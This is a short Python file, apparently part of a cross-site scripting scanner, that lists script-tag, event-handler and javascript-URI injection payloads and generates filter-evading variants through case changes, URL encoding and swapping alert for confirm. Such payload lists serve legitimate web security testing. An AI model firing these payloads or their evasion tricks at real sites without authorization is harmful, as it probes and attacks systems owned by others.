# payloads.py
def base_payloads():
    return [
        "<script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)"
    ]

def generate_payloads():
    base = base_payloads()
    mutated = []

    for p in base:
        mutated.append(p)
        mutated.append(p.upper())
        mutated.append(p.replace("<","%3C").replace(">","%3E"))
        mutated.append(p.replace("script","ScRiPt"))
        mutated.append(p.replace("alert","confirm"))

    return list(set(mutated))
